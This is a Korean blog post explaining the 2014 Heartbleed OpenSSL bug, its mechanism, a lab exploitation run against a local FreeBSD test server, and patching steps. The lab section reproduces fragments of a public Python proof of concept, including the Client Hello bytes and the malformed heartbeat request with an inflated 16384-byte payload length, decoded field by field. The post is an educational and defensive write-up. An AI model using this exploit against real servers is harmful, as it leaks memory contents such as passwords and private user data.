---
layout: post
title: "하트블리드(Heartbleed) 공격과 방어"
date: 2017-11-27 01:02:03 +0900
categories: security
comments: true

---
# 1. 서론
2014년 대다수 시스템 소프트웨어의 통신보안에 사용되는 OpenSSL에 중대한 취약점이 발견되었다. 이를 발견한 핀란드 보안 업체 ‘코데노미콘’은 이를 대중에게 설명하기 위하여 Heartbleed.com이라는 홈페이지를 개설하고 피를 흘리는 심장과 함께 이 취약점의 이름을 하트블리드(Heartbleed)라고 명명하였다. 이 취약점이 이런 이름으로 칭해지게 된 계기와 취약점 분석, 그리고 방어 방법에 대한 설명을 담았다.

# 2. 공격 원리
![Heartbleed-Diagram-Clean]({{ site.url }}/assets/images/heartbleed-attack-and-defense/Heartbleed-Diagram-Clean.jpg)  
(그림 1) 정상적인 하트비트 메시지 교환 [출처 : [forumsys.com](http://forumsys.com)]

OpenSSL 1.0.1 버전부터 하트비트(Heartbeat)라는 이름의 확장 모듈이 추가되었는데, 이는 TLS(Transport Layer Security) / DTLS(Datagram Transport Layer Security)  프로토콜에서 매번 연결을 재협상하지 않아도 통신연결을 유지하게 해주는 확장 규격이다.<sup id="a1">[1](#f1)</sup> 클라이언트가 하트비트를 요청하며 Payload와 해당 Payload의 길이를 보내면 서버 측에서는 하트비트 응답에 내용을 그대로 복사하여 되돌려주며 연결을 확인한다. (그림 1)에서의 상황을 예시로 정리해보면 먼저 클라이언트가 하트비트 요청으로 ‘HELLO’라는 문자의 Payload와 해당 Payload의 길이 5를 전송한다. 서버는 하트비트 요청 사항을 확인하고 하트비트에 클라이언트에서 온 ‘HELLO’라는 Payload와 Payload의 길이 5를 그대로 담아 응답한다. 이러한 일련의 과정을 주기적으로 반복하며 클라이언트와 서버 사이의 연결을 수립한다. 추가적으로 (그림1)의 상황에서 하트비트 교환 중 Payload의 예시로 사용된 메시지 ‘HELLO’는 단순히 이해하기 쉽도록 설명하기 위하여 표현된 임의의 메시지임을 설명한다.

![Heartbleed-Diagram-Corrupt]({{ site.url }}/assets/images/heartbleed-attack-and-defense/Heartbleed-Diagram-Corrupt.jpg)  
(그림 2) Payload 길이가 조작된 하트비트 메시지 교환 [출처 : [forumsys.com](http://forumsys.com)]

하트블리드는 여기서 하트비트 요청 메시지에 포함된 Payload와 Payload의 길이 부분 사이의 일치성을 확인하지 않는다는 점에서 발생하는 보안이슈이다. 서버에서 하트비트에 대한 응답을 할 때, 메모리에서 요청으로 들어온 Payload를, 마찬가지로 요청으로 들어온 Payload의 길이 만큼 빼내어 되돌려준다. 여기서 Payload의 길이의 값을 실제 Payload보다 훨씬 크게 잡으면 메모리에서 Payload의 뒤에 적혀 있는 값을 길이 만큼 모두 응답 패킷에 담아 보내버리는 버그가 발생한다.

(그림2)의 예시를 참고로 다시 한 번 정리를 해보면 클라이언트가 Payload를 ‘HELLO’, Payload의 길이를 25로 지정한 하트비트 메시지를 서버로 전송하였다. 서버는 이 하트비트 메시지를 메모리에 올려 확인한 다음 이에 대한 응답으로 길이가 25인 ‘HELLO’라는 메시지 응답을 한다. 하지만 ‘HELLO’는 5글자밖에 되지 않으므로 메모리의 ‘HELLO’를 초과하여 뒤이어지는 값까지 모두 포함한 25글자 길이의 메시지를 전송해버린다.

이러한 문제로 이 버그를 악용할 경우 메모리에 할당될 수 있는 아이디, 비밀번호, 사용자 개인 자료 등의 각종 정보가 외부로 노출될 수 있는 치명적인 취약점이 될 수 있다. 이 사태를 하트비트에서 발생한 보안 이슈를 이용하기 때문에 ‘하트블리드(Heartbleed, 심장출혈)’라는 명칭으로 불리게 되었다.

# 3. 공격 실습

하트블리드 취약점을 가지고 있는 버전의 Openssl이 기본 설치된 웹 서버를 테스트 환경으로 구축하고, 하트블리드 공격을 직접 경험하여 위험성에 대하여 실습한다. 테스트에 사용된 환경은 다음과 같다.

| OS           | 웹 서버                    | OpenSSL                | IP            |
| :----------: | :---------------------: | :--------------------: | :-----------: |
| FreeBSD 10.0 | Apache/2.4.18 (FreeBSD) | OpenSSL 1.0.1e-freebsd | 192.168.25.23 |

FreeBSD 10.0은 번들 패키지로 설치된 OpenSSL의 버전이 1.0.1e로 하트블리드에 취약한 대표적인 OS버전이다. 이 OS에 테스트 환경을 위해 아파치 HTTP 웹서버를 설치하고 개인키와 인증서를 적용하여 HTTPS/SSL이 적용된 웹 서버 환경을 구현한다. 이런 간단한 작업만으로 테스트를 위한 서버 환경을 구현할 수 있다. 필요에 따라서 사용하지 않는 컴퓨터, 또는 보조로 사용하는 하드디스크에 파티션을 나누어 구축할 수도 있고 간편하게는 VirtualBox나 VMware Workstation과 같은 소프트웨어를 이용하여 가상 머신으로 구현할 수 있다. 테스트 환경은 VirtualBox로 구현하고 네트워크 세팅을 ‘Bridged Adapter’로 설정하여 동일 네트워크의 다른 단말기에서 GuestOS에 접근이 가능하도록 하였다. 가상머신을 ‘Bridged Adapter’로 설정하고 GuestOS에서 네트워크 인터페이스 설정을 DHCP로 하면 가상머신을 구동하고 있는 HostOS 단말기가 연결되어있는 게이트웨이에서 IP를 할당받아 같은 네트워크에서 접근이 용이하다.

테스트 서버의 세팅이 완료되면 공격 스크립트를 준비한다. 마침 테스트하기 위해 좋은 스크립트가 Exploit Database(exploit-db.com)에 준비되어있다. Exploit Database는 취약점 테스트, 연구, 보안을 개선하기 위하여 여러 자료를 제공하며 테스트를 위한 취약점 공격 코드 또한 제공되고 있다. 마찬가지로 하트블리드에 관련된 여러 공격 코드가 게시되어 있다. 그중 Jared Stafford가 게시한 ‘OpenSSL TLS Heartbeat Extension - Memory Disclosure’라는 이름의 공격 코드를 이용한다.<sup id="a2">[2](#f2)</sup> 이 코드는 파이썬(Python)으로 작성되었다. 파라미터로 공격 대상 서버의 호스트 주소를 넘겨주면 서버에 접속을 연결하고, Handshake 메시지를 보낸다. 만약 서버에서 Handshake에 정상적으로 응답할 경우, 공격을 위하여 Payload 길이가 변조된 하트비트를 전송하여 공격한다. 이후 응답 메시지의 헥사 덤프를 화면에 출력한다. 이 응답 메시지는 공격이 성공할 경우, 서버 메모리 데이터 또한 포함한다.

```python
hello = h2bin('''
16 03 02 00 dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc 0c bc 2b 92
a8 48 97 cf bd 39 04 cc 16 0a 85 03
90 9f 77 04 33 d4 de 00 00 66 c0 14
c0 0a c0 22 c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35 00 84 c0 12
c0 08 c0 1c c0 1b 00 16 00 13 c0 0d
c0 03 00 0a c0 13 c0 09 c0 1f c0 1e
00 33 00 32 00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96 00 41 c0 11
c0 07 c0 0c c0 02 00 05 00 04 00 15
00 12 00 09 00 14 00 11 00 08 00 06
00 03 00 ff 01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34 00 32 00 0e
00 0d 00 19 00 0b 00 0c 00 18 00 09
00 0a 00 16 00 17 00 08 00 06 00 07
00 14 00 15 00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f 00 10 00 11
00 23 00 00 00 0f 00 01 01
''')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Connecting...'
sys.stdout.flush()
s.connect((args[0], opts.port))
print 'Sending Client Hello...'
sys.stdout.flush()
s.send(hello)
```
파라미터로 임력받은 공격 호스트에 접속하고 임의로 작성된 헥사코드를 바이너리로 바꾸고 그것을 전송하여 Handshake를 하는 과정이다. hello라는 변수에 입력되어있는 값을 하나씩 분석해보도록 한다.

|       |                 |
| - | - |
| 16    | Handshake       |
| 03 02 | TLS version 1.1 |
| 00 dc | Length          |

상단의 첫 메시지는 SSL Handshake를 가리키며, 프로토콜 버전, 그리고 길이를 정의하고 있다.

|          |                               |
| -------- | ----------------------------- |
| 01       | handshake type (Client hello) |
| 00 00 d8 | Length                        |
| 03 02    | TLS Version 1.1               |

바로 다음 헥사 코드는 어떤 타입의 Handshake 메시지인지를 정의하고 있다. 여기서는 Client Hello 형식이 이용되었다. 그리고 마찬가지로 길이, Handshake의 버전을 알려주고 있다.

|                                                                                     |              |
| ----------------------------------------------------------------------------------- | ------------ |
| 53 43 5b 90                                                                         | Timestamp    |
| 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de | Random bytes |

뒤이어 오는 값은 유닉스 타임스탬프와 28바이트 길이의 무작위로 작성된 값이 들어 있다.

|     |                      |
| --- | -------------------- |
| 00  | Length of session id |

세션 식별자의 길이에 대한 정보가 담겨있는 필드다. 이 필드는 보통 브라우저가 최근 서버에 방문하여 이전 세션을 이어가기 위하여 Abbreviated Handshake를 할 때 이용된다.

|                                                     |                         |
| --------------------------------------------------- | ----------------------- |
| 00 66                                               | Length of cipher suites |
| c0 14 c0 0a c0 22 c0 21 … 생략 … 08 00 06 00 03 00 ff | Cipher suites           |

다음 클라이언트에서 지원하는 암호방식(Cipher suites)의 리스트 메시지에 대한 길이와 해당 메시지가 작성되어있다. 각각의 암호방식은 2바이트로 작성되어있다. 예를들어, 가장 앞에 등장한 c0 14는 암호방식 중 TLS_EC DHE_RSA_WITH_AES_256_CBC_SHA를 의미한다.

|     |                                             |
| --- | ------------------------------------------- |
| 01  | Length of compression methods               |
| 00  | Compression method NULL (ie no compression) |

뒤에 나오는 필드는 압축에 관련되어있는 필드이다. 마찬가지로 압축 방법에 대한 필드의 길이와 압축 방법에 대한 정보에 대하여 정의되어있다. 여기서는 00으로 압축을 하지 않는다.

|       |                          |
| ----- | ------------------------ |
| 00 49 | Length of TLS extensions |

추가 확장에 관련된 정의를 한다. 다른 필드와 같이 길이에 대한 정의로 시작한다.

|                                                        |                                       |
| ------------------------------------------------------ | ------------------------------------- |
| 00 0b 00 04 03 00 01 02                                | Eliptic curve point formats extension |
| 00 0a 00 34 00 32 00 0e … 생략 … 00 03 00 0f 00 10 00 11 | Elliptic curve                        |

그 중 첫 두 가지의 확장 Elliptic-curve cipher에 관련하여 정의하고 있다.

|             |                    |
| ----------- | ------------------ |
| 00 23 00 00 | TLS session ticket |

그 다음 TLS 세셧 티켓 확장 모듈을 지원한다는 것을 알려준다.

|                |                     |
| -------------- | ------------------- |
| 00 0f 00 01 01 | Heartbeat extension |

마지막으로 우리의 목적인 TLS 하트비트 확장을 지원한다는 것을 정의한다.

이것으로 Cilent Hello 메시지에 대한 분석을 끝냈다. 서버에게서 Hello Done 응답 메시지를 성공적으로 받으면 하트비트 요청 메시지 작성을 시작한다.

```python
hb = h2bin('''
18 03 02 00 03
01 40 00
''')
s.send(hb)
hit_hb(s)
```
하트비트 요청 메시지 코드는 앞의 Client Hello에 비하면 훨씬 짧고 간단하게 되어있다.

|       |                           |
| - | - |
| 18    | TLS record is a heartbeat |
| 03 02 | TLS version 1.1           |

첫 필드는 TLS 레코드가 하트비트임을 명시하고 TLS 버전을 알려준다.

|       |                   |
| ----- | ----------------- |
| 00 03 | Length            |
| 01    | Heartbeat request |

다음으로 하트비트 메시지의 길이와 이 메시지가 하트비트 요청임을 명시 하고있다.

|       |                              |
| ----- | ---------------------------- |
| 40 00 | Payload length (16384 bytes) |

마지막으로, 공격의 핵심에 해당하는 부분이다. Payload의 길이를 16,384바이트라 표시하고 있다. 하지만 그 만큼의 길이에 해당하는 메시지를 보내지 않는다. 하트블리드 공격의 원리에 대하여 설명한 바와 같이 이 값에 의하여 해당 바이트 만큼의 서버 메모리에 있는 정보를 응답으로 되돌려 받는다. 마지막으로 이 파이썬 코드에서는 되돌려받은 메시지를 헥사 덤프로 화면에 출력한다.

다음으로 이 공격 스크립트 코드를 이용하여 테스트를 위한 취약 서버를 타겟으로 실행해보도록 한다. 서버는 앞서 설명한 바와 같이 1.0.1버전의 OpenSSL, 2.4.18 버전의 Apache가 80번, 443번 포트에 각각 HTTP, HTTPS 서비스를 동작시키고 있다.

![screenshot]({{ site.url }}/assets/images/heartbleed-attack-and-defense/screenshot.png)  
(그림 3) 하트블리드(Heartbleed) 취약점 공격 실습

파이썬 명령을 이용하여 공격 타겟의 IP(192.168.25.23)를 인자로 전달하여 실행한다. 스크립트 코드는 따로 지정해준 포트가 없으므로 HTTPS/SSL 서비스 기본 설정인 443번 포트에 Client Hello 메시지를 전송하여 Handshake를 수행하고 하트블리드 공격 코드 메시지를 전송한다. 이 결과로 (그림3)의 결과 화면과 같이 하트블리드 메시지 응답으로 서버의 메모리 데이터가 누출되어 헥사 덤프로 화면에 표시된다.

이처럼 간단한 원리와 공격 스크립트만으로 취약한 버전의 OpenSSL을 사용할 경우 서버 메모리에 로드되어있는 정보를 갈취할 수 있어 매우 심각한 버그에 해당한다.

# 4. 예방

하트블리드(Heartbleed)의 위험성은 OpenSSL의 버그에서 나타나는 것으로 단지 취약한 OpenSSL 버전을 업데이트하는 것으로 해킹을 예방할 수 있다. 하트블리드 취약점 버그가 있는 OpenSSL 버전은 1.0.1 ~ 1.0.1f에 해당한다. 1.0.1g 이후 버전은 패치되어 하트블리드 취약점 노출이 없다. 추가적으로 앞서 설명한 버전의 범위에 포함되더라도 대부분의 운영체제(OS)에서 긴급패치를 진행하여 업데이트를 수행하여 공격을 방지할 수 있다.

실습 예시로 사용된 운영체제 FreeBSD 10.0의 경우 freebsd-update 명령어를 이용하여  업데이트가 가능하다.

```bash
freebsd-update fetch
freebsd-update install
```
```bash
openssl version
# OpenSSL 1.0.1l-freebsd 15 Jan 2015
```
freebsd-update fetch를 이용하여 바이너리 보안 업데이트 정보를 가져오고, freebsd-update install 명령어로 설치한다. 이후 openssl version 명령어로 OpenSSL의 버전을 확인해보면 업데이트가 진행된 것을 확인 가능하다.
![screenshot2]({{ site.url }}/assets/images/heartbleed-attack-and-defense/screenshot2.png)  
(그림 4) OpenSSL 업데이트로 하트블리드 공격 실패

업데이트 이후 다시 취약점 공격 스크립트를 이용하여 확인하면 Handshake 과정은 정상적으로 이루어지나 하트비트를 통한 취약점 공격 메시지는 서버 측에서 응답하지 않아 실패하는 것을 확인할 수 있다.

데비안 계열 리눅스 운영체제는 APT명령어를 이용하여 OpenSSL 업데이트가 가능하다.
```bash
sudo apt-get update
sudo apt-get install openssl libssl-dev
```
기타 직접 취약점 패치가 이루어진 Openssl 버전을 다운로드받아 빌드하여 설치를 하여도 무관하다.

추가로 취약점 버전을 사용하는 동안 혹시 있었을지 모를 계정 정보 유출에 대비하여 서버에서 사용하는 모든 패스워드를 변경해주는 것을 권장한다.

# 5. 의견
평소에 대비를 하더라도 바이러스나 취약점으로 인한 해킹은 언제 어떤 방법으로 발생할지 예측하기 힘들다. 최근 발생한 사건으로는 지난 2016년 3월 압축 프로그램 반디집(bandizip)으로 유명한 반디소프트의 홈페이지와 같은 IP 대역을 사용하는 타사 서버가 해킹당했다. 크래커는 해킹된 서버에서 ARP 스푸핑을 시행하여 반디소프트 홈페이지에서 배포하는 이미지 뷰어 S/W 꿀뷰를 내려받으려 하면 악성코드가 내려받게 되도록 유도하였다. ARP 스푸핑 공격 후 약 50분 만에 상황을 인지한 반디소프트 담당자는 빠르게 대처하여 약 2시간 만에 상황을 해결하고 바로 백신 회사와 한국 인터넷 진흥원(KISA)에 사건을 접수하였다.

외부에서 접근하는 길이 존재하는 이상 보안위협의 가능성에 노출되어있는 것이나 마찬가지다. 우리는 항상 보안에 신경 써야 하며, 보안 이슈에 귀를 기울여야 한다. 반디소프트의 사건과 같이 준비를 하고 있더라도 원천차단이 불가능할 수도 있다. 하지만 재빠르게 대처하여 피해를 최소한으로 줄일 수 있었다. 특히나 하트블리드 버그는 해당 취약점으로 인해 데이터가 노출되어있는 동안 언제, 얼마나 많은 양의 정보가 누구에게 유출되었을지 모르기 때문에 취약점 버전을 사용한 적이 있는 서버는 더욱더 유출된 정보가 가져올 수 있는 혼란과 피해에 대비하고 예방하여야 한다.

# 참고문헌
http://www.westpoint.ltd.uk/blog/2014/04/14/understanding-the-heartbleed-proof-of-concept/

<b id="f1">1</b>. (주)이스트소프트 “OpenSSL 취약점 하트블리드(HeartBleed), 왜 위험한가?”, [blog.alyac.co.kr/76](http://blog.alyac.co.kr/76) (2016. 04. 01)

<b id="f2">2</b>.Jared Stafford, OpenSSL TLS Heartbeat Extension - Memory Disclosure, [www.exploit-db.com/exploits/32745/](https://www.exploit-db.com/exploits/32745/) (2016. 04. 01)